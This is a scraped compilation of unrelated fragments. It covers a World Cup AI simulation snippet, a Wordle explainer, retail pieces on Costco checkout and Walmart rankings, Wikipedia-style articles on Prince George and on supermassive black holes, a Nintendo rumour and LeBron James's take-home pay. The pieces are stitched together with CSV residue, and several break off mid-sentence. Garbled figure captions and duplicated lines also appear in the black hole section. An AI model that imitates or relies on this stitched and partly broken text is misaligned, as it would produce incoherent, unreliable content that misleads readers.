Still, it's interesting to look at the statistical methods involved in predicting what's going to happen in Russia. By the evening of the 15th of July, we'll know if those hundred thousand AI simulations got it right.

The study has yet to be peer-reviewed, but is available on the arXiv.org pre-print server.","An AI Has Simulated 100,000 World Cups And Discovered Who's Going to Win This Year",

You've probably heard of Wordle. But what the hell is a Wordle? Seen all those posts featuring yellow, green and gray boxes on social media? That's Wordle.

Here's everything you need to know...

What is Wordle?

Wordle is a daily word game you can find online here. It's fun, simple and, like a crossword, can only be played once a day. Every 24 hours there's a new word of the day, and it's up to you to figure out what it is. The site itself does a fantastic job of explaining the rules:

Wordle

Wordle gives players six chances to guess a randomly selected five-letter word. As shown above, if you have the right letter in the right spot, it shows up green. A correct letter in the wrong spot shows up yellow. A letter that isn't in the word in any spot shows up gray.

You can enter a total of six words, meaning you can enter five burner words from which you can learn hints about the letters and their placements. Then you get one chance to put those hints to use. Or you can try for performance and guess the word of the day in three, two or even one go.

Simple stuff, but also incredibly compelling.

So it's a word game? Big deal...

Yeah, it's just a word game. But it's super popular: Over 300,000 people play it daily, according to The New York Times. That popularity may sound perplexing, but there are a few tiny details that have resulted in everyone going absolutely bonkers for it.

There's only one puzzle per day: This creates a certain level of stakes. You only get one shot at the Wordle. If you mess up, you have to wait until tomorrow to get a brand new puzzle.

Everyone is playing the exact same puzzle: This is crucial, as it makes it easier to ping your buddy and chat about the day's puzzle. ""Today's was tough!"" ""How did you get on?"" ""Did you get it?"" Which takes us to the next point...

It's easy to share your results: Once you've successfully or unsuccessfully done the puzzle for the day, you're invited to share your Wordle journey for the day. If you tweet the image, it looks like this...

Note that the word and letters you chose are obscured. All that's shown is your journey toward the word in a series of yellow, green and gray boxes.

It's very compelling. If you get it easily, maybe in the second or third try, there's a gloating element whereby you must show your followers how smart you are and share.

If you get it by the skin of your teeth in the sixth go, that's also a cool story. But most importantly, the puzzle itself isn't spoiled.

Wordle 184 1/6 — Jason Imms 🅽🅸🅲🅴 (@jasonimms) December 21, 2021

So Wordle isn't just a word game, it's a conversation starter and a chance to show off on social media. That's why it's going viral.

Tips and tricks

If you're a word game purist, you may want to avoid the following tips and rely entirely on your own instincts. For everyone else who's sick of seeing gray boxes, here are some tips that you may find helpful.

Choosing your first word: The first word is arguably the most important. To maximize the value of your opening gambit, choose a word with three vowels and five different letters. Some examples: orate, media, radio. I always use ""adieu"" for some reason. It's a habit and I'm refusing to break it.

I just finished reading a fascinating piece by Tyler Glaiel, a programmer and game designer who tried to figure out the best possible starting word. Apparently we should all be kicking off Wordle with the word ""roate."" Honestly, read this whole article, it's great.

Avoid reusing grays: There's a keyboard at the bottom of the Wordle board that shows what letters are green, yellow and gray. Avoid reusing letters that have come up gray. Yes, this sounds obvious. But it can take time and effort to think of five-letter words that don't use letters you've already tried. That effort will pay off.

Letters can appear twice: This complicates matters, especially when you're running out of letters to try on word four or five. But letters often recur, as with words like chill, sissy and ferry having been the correct answers in the past.

Who made Wordle?

Wordle is the work of software engineer Josh Wardle, who originally created the game for his partner, a fan of word games, and tells the BBC it will never become laden with ads. Extremely online people may remember Wardle as the creator of Place, an utterly wild collaborative art project/social experiment that sent the internet into a tizzy in April 2017.

Place was a shared online space that allowed literally anyone to fight over what was drawn there. It resulted in huge, sprawling communities battling over space on this gigantic online canvas.

It ultimately ended up looking like this:

Reddit

Wordle got a mention in The New York Times in November, but really got traction when the share element got added.

In a Reddit post, Wardle said he wanted Wordle to feel like a croissant, a ""delightful snack"" that's enjoyed occasionally. This is explicitly why there's only one puzzle per day. ""Enjoyed too often,"" he explained, ""and they lose their charm,"" Wardle says.

Agreed.

New York Times acquisition

At the end of January, creator Josh Wardle sold Wordle to the New York Times for a figure ""in the low seven figures.""

Wardle noted that his ""game has gotten bigger than I ever imagined"" and added he's ""just one person.""



The game will ultimately become part of New York Times subscription puzzle service, but Wardle made sure that Wordle would remain free-to-play and that current streaks would be preserved in the move.

""It is important to me that, as Wordle grows, it continues to provide a great experience to everyone,"" Wardle said. ""Given this, I am incredibly pleased to announce that I've reached an agreement with The New York Times for them to take over running Wordle going forward.""

Wordle hasn't gotten harder since joining the New York Times

It just hasn't! Come on folks!



According to The New York Times: ""Nothing has changed about the game play,"" the Times' communications director, Jordan Cohen, said to CNET in an email.

If you check out the game's script you can see that the New York Times hasn't made any significant changes to the game.

Costco is great for bulk shopping including everything from food and drinks to electronics and prescriptions. But the big thing Costco stores lack isn’t a product or brand-named item—it’s express checkout.

recently asked Costco CEO W. Craig Jelinek some popular questions about the chain store, like if non-members will ever be allowed to shop and if the store will ever sell plus-size clothing. One key question on everyone’s minds? Why Costco doesn’t have express checkout lanes for people buying only one or two items. Jelinek says that an express lane isn’t the most cost-effective idea since so many shoppers are there to buy numerous items in large quantities, like these foods nutritionists always buy from Costco.

“Costco’s ability to sell merchandise at incredibly low prices is based on adhering to various operating disciplines at every turn,” Jelinek says. “Instead of having an express line—that often would be open but without a member in line—we have invested millions of dollars to speed up the entire front-end process.”

Jelinek continues to say that Costco policy indicates no more than one person in line and two behind. According to Jelinek, the average checkout time is just over one minute.

Surveyors complained mostly about grocery stores with too few checkout lanes and long lines, congested aisles, too few food choices, and a poor selection of local products. Some of the worst offenders include Target, Aldi, and Stop and Shop. But the worst of the worst, according to survey results, is Walmart.

The discount chain store undoubtedly has competitive pricing. In fact, that's the one category where Walmart was highly ranked. The low overall ranking, however, stems from low rankings in seven out of 12 possible categories. This includes cleanliness, staff courtesy, checkout speed, produce and meat quality, and local produce selection. That's a far cry from the grocery store with the best reputation.

The superstore also came in last in the supermarket category in the most recent report by the American Customer Satisfaction Index. Again, customers were dissatisfied with the slow checkout speed and unfriendliness of the staff. The stores taking the top spots on ACSI's report were Trader Joe's and Wegmans—these stores also show up consistently as being highly rated grocery stores in the United States for overall value, too.

Walmart has also faced criticism in the past for its poor relationship with workers. Business Insider reports that the company even spent more than $18 million on ads in 2017 to highlight recent investments and changes in company policy.

On the bright side, some popular stores did rank well. Fareway Stores, Wegmans, and Publix are amongst the top. Only about 23 to 30 percent of surveyors had a complaint about them—making them the least complained about in the ratings. Can't find one of these stores near you?

Prince George of Cambridge (George Alexander Louis; born 22 July 2013) is a member of the British royal family. He is the eldest child of Prince William, Duke of Cambridge, and Catherine, Duchess of Cambridge, and is third in the line of succession to the British throne, behind his grandfather Prince Charles and his father. Due to his rank in the line of succession, and the subsequent expectation that he will one day become the British monarch, his birth was widely celebrated across the Commonwealth realms. George occasionally accompanies his parents on royal tours and engagements.

Birth and christening [ edit ]

George in the arms of his mother, July 2013

Prince George was born in the Lindo Wing of St Mary's Hospital, London, at 16:24 BST (15:24 UTC) on 22 July 2013.[2] The birth was announced by press release, and was followed by the display of a traditional easel in the forecourt of Buckingham Palace.[2][3] The newborn was widely hailed as a future king in the majority of British newspapers.[4][5] 21-gun salutes signalled the birth in the capitals of Bermuda[6] and New Zealand;[7] the bells of Westminster Abbey and many other churches were rung;[8][9] and landmarks in the Commonwealth realms were illuminated in various colours, mostly blue to signify the birth of a boy.[10] On 24 July, his name was announced as George Alexander Louis.[11] Prince George's official title and style is ""His Royal Highness Prince George of Cambridge"",[12][13] which he has carried since birth, in accordance with Letters Patent dated 1898,[14] 1917,[15] and most recently 31 December 2012.[16]

George's father, the Duke of Cambridge, is the elder son of the Prince of Wales, who is the heir apparent to Queen Elizabeth II,[17] placing George third in the line of succession to the British throne.[18] Speculation ensued during the pregnancy of the Duchess of Cambridge that George's birth would boost the British national economy and provide a focus for national pride.[18] Commemorative coins were issued by the Royal Mint and the Royal Canadian Mint,[19][20] the first time a royal birth had been marked that way.[19] Prince George's birth marked the second time that three generations in direct line of succession to the throne have been alive at the same time, a situation that last occurred between 1894 and 1901, in the last seven years of the reign of Queen Victoria.[21]

George was christened by Justin Welby, Archbishop of Canterbury, in the Chapel Royal at St James's Palace on 23 October 2013, with Oliver Baker, Emilia Jardine-Paterson, Earl Grosvenor, Jamie Lowther-Pinkerton, Julia Samuel, William van Cutsem and Zara Tindall serving as godparents.[22][23] The font used at the ceremony was made for Queen Victoria's first child and the water was taken from the River Jordan.[24][25] Prince George spent his first months at his parents' cottage on the grounds of Bodorgan Hall in Anglesey, Wales, before his family relocated to Kensington Palace in 2014.[26][27] His younger siblings, Charlotte and Louis, were born in 2015 and 2018, respectively.[28]

Education [ edit ]

George's formal education began in January 2016, when, at the age of two, he began attending the Westacre Montessori School Nursery, near his family home at Anmer Hall in Norfolk.[29] He attended his first day of primary school on 7 September 2017 at the Thomas's School in Battersea.[30][31] He attends the school under the name of George Cambridge.[32]

Official appearances [ edit ]

George embarked on his first royal tour with his parents in April 2014, during which the Cambridges spent three weeks in New Zealand and Australia. Although he only appeared twice, the BBC described the ""nine-month-old future king"" as ""the star of the show"".[33] Prime Minister of Australia Tony Abbott predicted in Parliament House, Canberra, that George would one day be welcomed there as King of Australia.[33] In June 2015, he made his first public appearance on the balcony of Buckingham Palace following the Trooping the Colour parade marking the Queen's Official Birthday.[34]

On 22 April 2016, George met U.S. President Barack Obama and his wife Michelle Obama. He was photographed with a rocking horse that the Obamas had given him when he was born. The encounter later prompted Barack Obama to joke that ""Prince George showed up to our meeting in his bathrobe... a clear breach of protocol.""[35] George and his younger sister, Charlotte, accompanied their parents on a tour of Canada in September 2016,[36][37] and on a diplomatic visit to Poland and Germany in July 2017.[38]

In March 2020, Prince George joined his siblings, Charlotte and Louis, in an online video to applaud key workers during the coronavirus pandemic.[39] In September 2020, the children met David Attenborough; Kensington Palace subsequently released a video of them asking Attenborough questions regarding environmental conservation.[40][41] In December 2020, they made their first red carpet appearance accompanying their parents to the London Palladium for a performance of a pantomime held to thank key workers for their efforts during the pandemic.[42]

In 2021, he and his parents attended the England–Italy final of UEFA Euro 2020 at Wembley Stadium in London. He was referred to as a ""good-luck charm"" after England won an earlier game he attended.[43]

Public image [ edit ]

The ""Prince George effect"", sometimes known as the ""royal baby effect"", is a term used to describe an uptick in sales of clothing and other products used by George.[44] In 2016, the dressing gown that he wore while meeting President Obama sold out after he was seen wearing it.[45] In September 2017 the news that the Prince's school had served a Le Puy green lentil dish resulted in a spike in the sales of the legume.[46] He was ranked number 49 on GQ's ""50 Best Dressed Men in Britain"" list in 2015.[47] In 2018, George became the youngest person to appear on Tatler's best-dressed list.[48]

George's parents have been adamant about maintaining their son's privacy as he grows up.[49] In August 2015, Kensington Palace stated that they wanted all global media to stop taking unauthorised photographs of George, saying that ""a line [had] been crossed"" in paparazzi methods of locating and photographing him, including surveilling the family and sending children to bring George into view.[50]

In July 2018, an ISIS supporter and propagandist who had encouraged an attack on George's school in October 2017 was jailed for life with a minimum of 25 years.[51]

In the British satirical sketch programme Newzoids then toddler Prince George is depicted as a rebellious, foul mouthed character with a lewd sense of humour.[52] The 2016 children's book Winnie-the-Pooh Meets the Queen, written in honour of the 90th birthdays of both Queen Elizabeth II and the fictional character of Winnie-the-Pooh, features a cameo appearance from Prince George, whom Piglet presents a red balloon.[53] The 2021 animated sitcom The Prince stars a fictionalised eight-year-old Prince George (voiced by showrunner Gary Janetti) who makes life difficult both for his family and for the British monarchy.[54]

In fact, it’s not even official as Nintendo hasn’t announced it yet. But the new Switch capability might come real soon, as Nintendo’s E3 keynote scheduled for 12 PM EST.

The news comes from Business Insider which spotted this Best Buy page:

James was docked almost $13 million in taxes, plus another $4 million in other costs, according to the estimate.

James is estimated to make about $55 million off the court in endorsements and has the chance to become the highest-paid player in NBA history this offseason.

By now we know that most athletes' contracts aren't what they seem.

Though the numbers in the contracts are enormous, after federal, state, and local taxes, plus fees for agents and other costs, athletes usually ending up taking home close to half of their base salary.

ESPN's Darren Rovell broke down what LeBron James, the second-highest-paid player in the NBA this season, made from his $33 million contract. While it's still quite a big number, based on Rovell's estimate, it's less than half of that figure.

According to Rovell, James was docked $11.9 million in federal taxes, $2.1 million in state and city taxes, $950,000 in agent fees (agents usually collect 2-3% of player contracts), and another $18,000 in his 401(k) based on 2017 estimates.

James also lost an estimated $3.3 million to the NBA escrow, a 10% fee players pay to balance the basketball-related income split between themselves and the owners. James received some money back from the year before because revenues exceeded the forecast. (Read more on the escrow here).

James did, however, make some money back from last year's NBA escrow and a bit more in a shortfall.

In total, Rovell estimated that James made about $16.7 million this year.

Luckily for James, he's an even bigger earner off the court — it's been estimated he makes $55 million in endorsements.

James' situation is not unlike that of Stephen Curry, who also took home about half of his NBA-record $35 million salary.

Other professional athletes have said their salary numbers should be cut in half right from the get-go because of taxes. Los Angeles Rams defensive end Ndamukong Suh told Business Insider he didn't think the average person understood what athletes make and how many expenses they have.

PHYSICS-ASTRONOMY.COM

",10/06/2018 15:30,https://en.wikipedia.org/wiki/Supermassive_black_hole,"This article is about the astronomical object. For the song by the band Muse, see Supermassive Black Hole (song)

Largest type of black hole; usually found at the center of galaxies

[1][2] It shows 350 350 AU [3] The image was released in 2019 by the This is the first direct image of a supermassive black hole, located at the galactic core of Messier 87 It shows radio-wave emission from a heated accretion ring orbiting the object at a mean separation of, or ten times larger than the orbit of Neptune around the Sun. The dark center is the event horizon and its shadow.The image was released in 2019 by the Event Horizon Telescope Collaboration.

A supermassive black hole (SMBH or sometimes SBH)[4] is the largest type of black hole, with its mass being on the order of millions to billions of times the mass of the Sun ( M ☉ ). Black holes are a class of astronomical objects that have undergone gravitational collapse, leaving behind spheroidal regions of space from which nothing can escape, not even light. Observational evidence indicates that almost every large galaxy has a supermassive black hole at its center.[5][6] For example, the Milky Way has a supermassive black hole in its Galactic Center, corresponding to Sagittarius A*.[7][8] Accretion of interstellar gas onto supermassive black holes is the process responsible for powering active galactic nuclei and quasars.[9]

Description [ edit ]

Supermassive black holes are classically defined as black holes with a mass above 0.1 million to 1 million M ☉ .[10] Some astronomers have begun labeling black holes of at least 10 billion M ☉ as ultramassive black holes.[11][12] Most of these (such as TON 618) are associated with exceptionally energetic quasars. Even larger ones have been dubbed stupendously large black holes (SLAB) with masses greater than 100 billion M ☉ .[13] Although they noted there is currently no evidence that stupendously large black holes are real, they noted that supermassive black holes almost that size do exist.[14] Some studies have suggested that the maximum mass that a black hole can reach, while being luminous accretors, is of the order of ~50 billion M ☉ .[15][16]

Supermassive black holes have physical properties that clearly distinguish them from lower-mass classifications. First, the tidal forces in the vicinity of the event horizon are significantly weaker for supermassive black holes. The tidal force on a body at a black hole's event horizon is inversely proportional to the square of the black hole's mass:[17] a person at the event horizon of a 10 million M ☉ black hole experiences about the same tidal force between their head and feet as a person on the surface of the earth. Unlike with stellar mass black holes, one would not experience significant tidal force until very deep into the black hole.[18] In addition, it is somewhat counterintuitive to note that the average density of a SMBH within its event horizon (defined as the mass of the black hole divided by the volume of space within its Schwarzschild radius) can be less than the density of water.[19] This is because the Schwarzschild radius is directly proportional to its mass. Since the volume of a spherical object (such as the event horizon of a non-rotating black hole) is directly proportional to the cube of the radius, the density of a black hole is inversely proportional to the square of the mass, and thus higher mass black holes have lower average density.[20]

The Schwarzschild radius of the event horizon of a (nonrotating) supermassive black hole of ~1 billion M ☉ is comparable to the semi-major axis of the orbit of planet Uranus, which is 19 AU.[21][22]

History of research [ edit ]

The story of how supermassive black holes were found began with the investigation by Maarten Schmidt of the radio source 3C 273 in 1963. Initially this was thought to be a star, but the spectrum proved puzzling. It was determined to be hydrogen emission lines that had been red shifted, indicating the object was moving away from the Earth.[23] Hubble's law showed that the object was located several billion light-years away, and thus must be emitting the energy equivalent of hundreds of galaxies. The rate of light variations of the source dubbed a quasi-stellar object, or quasar, suggested the emitting region had a diameter of one parsec or less. Four such sources had been identified by 1964.[24]

In 1963, Fred Hoyle and W. A. Fowler proposed the existence of hydrogen burning supermassive stars (SMS) as an explanation for the compact dimensions and high energy output of quasars. These would have a mass of about 105 – 109 M ☉ . However, Richard Feynman noted stars above a certain critical mass are dynamically unstable and would collapse into a black hole, at least if they were non-rotating.[25] Fowler then proposed that these supermassive stars would undergo a series of collapse and explosion oscillations, thereby explaining the energy output pattern. Appenzeller and Fricke (1972) built models of this behavior, but found that the resulting star would still undergo collapse, concluding that a non-rotating 0.75×106 M ☉ SMS ""cannot escape collapse to a black hole by burning its hydrogen through the CNO cycle"".[26]

Edwin E. Salpeter and Yakov Zeldovich made the proposal in 1964 that matter falling onto a massive compact object would explain the properties of quasars. It would require a mass of around 108 M ☉ to match the output of these objects. Donald Lynden-Bell noted in 1969 that the infalling gas would form a flat disk that spirals into the central ""Schwarzschild throat"". He noted that the relatively low output of nearby galactic cores implied these were old, inactive quasars.[27] Meanwhile, in 1967, Martin Ryle and Malcolm Longair suggested that nearly all sources of extra-galactic radio emission could be explained by a model in which particles are ejected from galaxies at relativistic velocities; meaning they are moving near the speed of light.[28] Martin Ryle, Malcolm Longair, and Peter Scheuer then proposed in 1973 that the compact central nucleus could be the original energy source for these relativistic jets.[27]

Arthur M. Wolfe and Geoffrey Burbidge noted in 1970 that the large velocity dispersion of the stars in the nuclear region of elliptical galaxies could only be explained by a large mass concentration at the nucleus; larger than could be explained by ordinary stars. They showed that the behavior could be explained by a massive black hole with up to 1010 M ☉ , or a large number of smaller black holes with masses below 103 M ☉ .[29] Dynamical evidence for a massive dark object was found at the core of the active elliptical galaxy Messier 87 in 1978, initially estimated at 5×109 M ☉ .[30] Discovery of similar behavior in other galaxies soon followed, including the Andromeda Galaxy in 1984 and the Sombrero Galaxy in 1988.[5]

Donald Lynden-Bell and Martin Rees hypothesized in 1971 that the center of the Milky Way galaxy would contain a massive black hole.[31] Sagittarius A* was discovered and named on February 13 and 15, 1974, by astronomers Bruce Balick and Robert Brown using the Green Bank Interferometer of the National Radio Astronomy Observatory.[32] They discovered a radio source that emits synchrotron radiation; it was found to be dense and immobile because of its gravitation. This was, therefore, the first indication that a supermassive black hole exists in the center of the Milky Way.

The Hubble Space Telescope, launched in 1990, provided the resolution needed to perform more refined observations of galactic nuclei. In 1994 the Faint Object Spectrograph on the Hubble was used to observe Messier 87, finding that ionized gas was orbiting the central part of the nucleus at a velocity of ±500 km/s. The data indicated a concentrated mass of (2.4±0.7)×109 M ☉ lay within a 0.25″ span, providing strong evidence of a supermassive black hole.[33] Using the Very Long Baseline Array to observe Messier 106, Miyoshi et al. (1995) were able to demonstrate that the emission from an H 2 O maser in this galaxy came from a gaseous disk in the nucleus that orbited a concentrated mass of 3.6×107 M ☉ , which was constrained to a radius of 0.13 parsecs. Their ground-breaking research noted that a swarm of solar mass black holes within a radius this small would not survive for long without undergoing collisions, making a supermassive black hole the sole viable candidate.[34] Accompanying this observation which provided the first confirmation of supermassive black holes was the discovery[35] of the highly broadened, ionised iron Kα emission line (6.4 keV) from the galaxy MCG-6-30-15. The broadening was due to the gravitational redshift of the light as it escaped from just 3 to 10 Schwarzschild radii from the black hole.

On April 10, 2019, the Event Horizon Telescope collaboration released the first horizon-scale image of a black hole, in the center of the galaxy Messier 87.[2]

In February 2020, astronomers reported that a cavity in the Ophiuchus Supercluster, originating from a supermassive black hole, is a result of the largest known explosion in the Universe since the Big Bang.[36][37][38]

In March 2020, astronomers suggested that additional subrings should form the photon ring, proposing a way of better detecting these signatures in the first black hole image.[39][40][41]

Formation [ edit ]

The origin of supermassive black holes remains an open field of research. Astrophysicists agree that black holes can grow by accretion of matter and by merging with other black holes.[42][43] There are several hypotheses for the formation mechanisms and initial masses of the progenitors, or ""seeds"", of supermassive black holes. Independently of the specific formation channel for the black hole seed, given sufficient mass nearby, it could accrete to become an intermediate-mass black hole and possibly a SMBH if the accretion rate persists.[44]

The early progenitor seeds may be black holes of tens or perhaps hundreds of solar masses that are left behind by the explosions of massive stars and grow by accretion of matter. Another model involves a dense stellar cluster undergoing core collapse as the negative heat capacity of the system drives the velocity dispersion in the core to relativistic speeds.[45][46]

Before the first stars, large gas clouds could collapse into a ""quasi-star"", which would in turn collapse into a black hole of around 20 M ☉ .[44] These stars may have also been formed by dark matter halos drawing in enormous amounts of gas by gravity, which would then produce supermassive stars with tens of thousands of solar masses.[47][48] The ""quasi-star"" becomes unstable to radial perturbations because of electron-positron pair production in its core and could collapse directly into a black hole without a supernova explosion (which would eject most of its mass, preventing the black hole from growing as fast).

A more recent theory proposes that SMBH seeds were formed in the very early universe each from the collapse of a Supermassive star with mass of around 100,000 solar masses.[49]

Large, high-redshift clouds of metal-free gas,[50] when irradiated by a sufficiently intense flux of Lyman–Werner photons,[51] can avoid cooling and fragmenting, thus collapsing as a single object due to self-gravitation.[52][53] The core of the collapsing object reaches extremely large values of the matter density, of the order of about 107 g/cm3, and triggers a general relativistic instability.[54] Thus, the object collapses directly into a black hole, without passing from the intermediate phase of a star, or of a quasi-star. These objects have a typical mass of about 100,000 M ☉ and are named direct collapse black holes.[55]

[56] Artist's impression of the huge outflow ejected from the quasar SDSS J1106+1939 [57] Artist's illustration of galaxy with jets from a supermassive black hole.

Finally, primordial black holes could have been produced directly from external pressure in the first moments after the Big Bang. These primordial black holes would then have more time than any of the above models to accrete, allowing them sufficient time to reach supermassive sizes. Formation of black holes from the deaths of the first stars has been extensively studied and corroborated by observations. The other models for black hole formation listed above are theoretical.

The formation of a supermassive black hole requires a relatively small volume of highly dense matter having small angular momentum. Normally, the process of accretion involves transporting a large initial endowment of angular momentum outwards, and this appears to be the limiting factor in black hole growth. This is a major component of the theory of accretion disks. Gas accretion is the most efficient and also the most conspicuous way in which black holes grow. The majority of the mass growth of supermassive black holes is thought to occur through episodes of rapid gas accretion, which are observable as active galactic nuclei or quasars. Observations reveal that quasars were much more frequent when the Universe was younger, indicating that supermassive black holes formed and grew early. A major constraining factor for theories of supermassive black hole formation is the observation of distant luminous quasars, which indicate that supermassive black holes of billions of solar masses had already formed when the Universe was less than one billion years old. This suggests that supermassive black holes arose very early in the Universe, inside the first massive galaxies.

[58] Artist's impression of stars born in winds from supermassive black holes.

There is an upper limit to how large supermassive black holes can grow. So-called ultramassive black holes (UMBHs), which are at least ten times the size of most supermassive black holes, at 10 billion solar masses or more, appear to have a theoretical upper limit of around 50 billion solar masses, as anything above this slows growth down to a crawl (the slowdown tends to start around 10 billion solar masses) and causes the unstable accretion disk surrounding the black hole to coalesce into stars that orbit it.[59][60][61][62]

Distant supermassive black holes, such as J0313–1806,[63] and ULAS J1342+0928,[64] are hard to explain so soon after the Big Bang. Some postulate they might come from direct collapse of dark matter with self-interaction.[65][66][67] A small minority of sources argue that they may be evidence that the Universe is the result of a Big Bounce, instead of a Big Bang, with these supermassive black holes being formed before the Big Bounce.[68][69]

Activity and galactic evolution [ edit ]

Gravitation from supermassive black holes in the center of many galaxies is thought to power active objects such as Seyfert galaxies and quasars, and the relationship between the mass of the central black hole and the mass of the host galaxy depends upon the galaxy type.[70][71]

An active galactic nucleus (AGN) is now considered to be a galactic core hosting a massive black hole that is accreting matter and displays a sufficiently strong luminosity. The nuclear region of the Milky Way, for example, lacks sufficient luminosity to satisfy this condition. The unified model of AGN is the concept that the large range of observed properties of the AGN taxonomy can be explained using just a small number of physical parameters. For the initial model, these values consisted of the angle of the accretion disk's torus to the line of sight and the luminosity of the source. AGN can be divided into two main groups: a radiative mode AGN in which most of the output is in the form of electromagnetic radiation through an optically thick accretion disk, and a jet mode in which relativistic jets emerge perpendicular to the disk.[72]

An empirical correlation between the size of supermassive black holes and the stellar velocity dispersion σ {\displaystyle \sigma } of a galaxy bulge[73] is called the M–sigma relation.

Evidence [ edit ]

Doppler measurements [ edit ]

[74] for Simulation of a side view of a black hole with transparent toroidal ring of ionized matter according to a proposed modelfor Sgr A* . This image shows the result of bending of light from behind the black hole, and it also shows the asymmetry arising by the Doppler effect from the extremely high orbital speed of the matter in the ring.

Some of the best evidence for the presence of black holes is provided by the Doppler effect whereby light from nearby orbiting matter is red-shifted when receding and blue-shifted when advancing. For matter very close to a black hole the orbital speed must be comparable with the speed of light, so receding matter will appear very faint compared with advancing matter, which means that systems with intrinsically symmetric discs and rings will acquire a highly asymmetric visual appearance. This effect has been allowed for in modern computer-generated images such as the example presented here, based on a plausible model[74] for the supermassive black hole in Sgr A* at the center of the Milky Way. However, the resolution provided by presently available telescope technology is still insufficient to confirm such predictions directly.

What already has been observed directly in many systems are the lower non-relativistic velocities of matter orbiting further out from what are presumed to be black holes. Direct Doppler measures of water masers surrounding the nuclei of nearby galaxies have revealed a very fast Keplerian motion, only possible with a high concentration of matter in the center. Currently, the only known objects that can pack enough matter in such a small space are black holes, or things that will evolve into black holes within astrophysically short timescales. For active galaxies farther away, the width of broad spectral lines can be used to probe the gas orbiting near the event horizon. The technique of reverberation mapping uses variability of these lines to measure the mass and perhaps the spin of the black hole that powers active galaxies.

In the Milky Way [ edit ]

[75] Inferred orbits of 6 stars around supermassive black hole candidate Sagittarius A* at the Milky Way galactic center

Astronomers are confident that the Milky Way galaxy has a supermassive black hole at its center, 26,000 light-years from the Solar System, in a region called Sagittarius A*[76] because:

The star S2 follows an elliptical orbit with a period of 15.2 years and a pericenter (closest distance) of 17 light-hours ( 1.8 × 10 13 m or 120 AU) from the center of the central object. [77]

or 120 AU) from the center of the central object. From the motion of star S2, the object's mass can be estimated as 4.1 million M ☉ , [78] [79] or about 8.2 × 10 36 kg .

, or about . The radius of the central object must be less than 17 light-hours, because otherwise S2 would collide with it. Observations of the star S14 [80] indicate that the radius is no more than 6.25 light-hours, about the diameter of Uranus' orbit.

indicate that the radius is no more than 6.25 light-hours, about the diameter of Uranus' orbit. No known astronomical object other than a black hole can contain 4.1 million M ☉ in this volume of space.

Infrared observations of bright flare activity near Sagittarius A* show orbital motion of plasma with a period of 45±15 min at a separation of six to ten times the gravitational radius of the candidate SMBH. This emission is consistent with a circularized orbit of a polarized ""hot spot"" on an accretion disk in a strong magnetic field. The radiating matter is orbiting at 30% of the speed of light just outside the innermost stable circular orbit.[81]

On January 5, 2015, NASA reported observing an X-ray flare 400 times brighter than usual, a record-breaker, from Sagittarius A*. The unusual event may have been caused by the breaking apart of an asteroid falling into the black hole or by the entanglement of magnetic field lines within gas flowing into Sagittarius A*, according to astronomers.[82]

Outside the Milky Way [ edit ]

Unambiguous dynamical evidence for supermassive black holes exists only in a handful of galaxies;[84] these include the Milky Way, the Local Group galaxies M31 and M32, and a few galaxies beyond the Local Group, e.g. NGC 4395. In these galaxies, the mean square (or rms) velocities of the stars or gas rises proportionally to 1/ r near the center, indicating a central point mass. In all other galaxies observed to date, the rms velocities are flat, or even falling, toward the center, making it impossible to state with certainty that a supermassive black hole is present.[84] Nevertheless, it is commonly accepted that the center of nearly every galaxy contains a supermassive black hole.[85] The reason for this assumption is the M–sigma relation, a tight (low scatter) relation between the mass of the hole in the 10 or so galaxies with secure detections, and the velocity dispersion of the stars in the bulges of those galaxies.[86] This correlation, although based on just a handful of galaxies, suggests to many astronomers a strong connection between the formation of the black hole and the galaxy itself.[85]

The nearby Andromeda Galaxy, 2.5 million light-years away, contains a (1.1–2.3)×108 (110–230 million) M ☉ central black hole, significantly larger than the Milky Way's.[87] The largest supermassive black hole in the Milky Way's vicinity appears to be that of Messier 87 (i.e. M87*), at a mass of (6.4±0.5)×109 (c. 6.4 billion) M ☉ at a distance of 53.5 million light-years.[88][89] The supergiant elliptical galaxy NGC 4889, at a distance of 336 million light-years away in the Coma Berenices constellation, contains a black hole measured to be 2.1×1010 (21 billion) M ☉ .[90]

Masses of black holes in quasars can be estimated via indirect methods that are subject to substantial uncertainty. The quasar TON 618 is an example of an object with an extremely large black hole, estimated at 6.6×1010 (66 billion) M ☉ .[91] Its redshift is 2.219. Other examples of quasars with large estimated black hole masses are the hyperluminous quasar APM 08279+5255, with an estimated mass of 2.3×1010 (23 billion) M ☉ , and the quasar S5 0014+81, with a mass of 4.0×1010 (40 billion) M ☉ , or 10,000 times the mass of the black hole at the Milky Way Galactic Center.

Some galaxies, such as the galaxy 4C +37.11, appear to have two supermassive black holes at their centers, forming a binary system. If they collided, the event would create strong gravitational waves.[92] Binary supermassive black holes are believed to be a common consequence of galactic mergers.[93] The binary pair in OJ 287, 3.5 billion light-years away, contains the most massive black hole in a pair, with a mass estimated at 18 billion M ☉ .[94] In 2011, a super-massive black hole was discovered in the dwarf galaxy Henize 2-10, which has no bulge. The precise implications for this discovery on black hole formation are unknown, but may indicate that black holes formed before bulges.[95]

On March 28, 2011, a supermassive black hole was seen tearing a mid-size star apart.[96] That is the only likely explanation of the observations that day of sudden X-ray radiation and the follow-up broad-band observations.[97][98] The source was previously an inactive galactic nucleus, and from study of the outburst the galactic nucleus is estimated to be a SMBH with mass of the order of a million solar masses. This rare event is assumed to be a relativistic outflow (material being emitted in a jet at a significant fraction of the speed of light) from a star tidally disrupted by the SMBH. A significant fraction of a solar mass of material is expected to have accreted onto the SMBH. Subsequent long-term observation will allow this assumption to be confirmed if the emission from the jet decays at the expected rate for mass accretion onto a SMBH.

A gas cloud with several times the mass of the Earth is accelerating towards a supermassive black hole at the centre of the Milky Way.

In 2012, astronomers reported an unusually large mass of approximately 17 billion M ☉ for the black hole in the compact, lenticular galaxy NGC 1277, which lies 220 million light-years away in the constellation Perseus. The putative black hole has approximately 59 percent of the mass of the bulge of this lenticular galaxy (14 percent of the total stellar mass of the galaxy).[99] Another study reached a very different conclusion: this black hole is not particularly overmassive, estimated at between 2 and 5 billion M ☉ with 5 billion M ☉ being the most likely value.[100] On February 28, 2013 astronomers reported on the use of the NuSTAR satellite to accurately measure the spin of a supermassive black hole for the first time, in NGC 1365, reporting that the event horizon was spinning at almost the speed of light.[101][102]



In September 2014, data from different X-ray telescopes have shown that the extremely small, dense, ultracompact dwarf galaxy M60-UCD1 hosts a 20 million solar mass black hole at its center, accounting for more than 10% of the total mass of the galaxy. The discovery is quite surprising, since the black hole is five times more massive than the Milky Way's black hole despite the galaxy being less than five-thousandths the mass of the Milky Way.

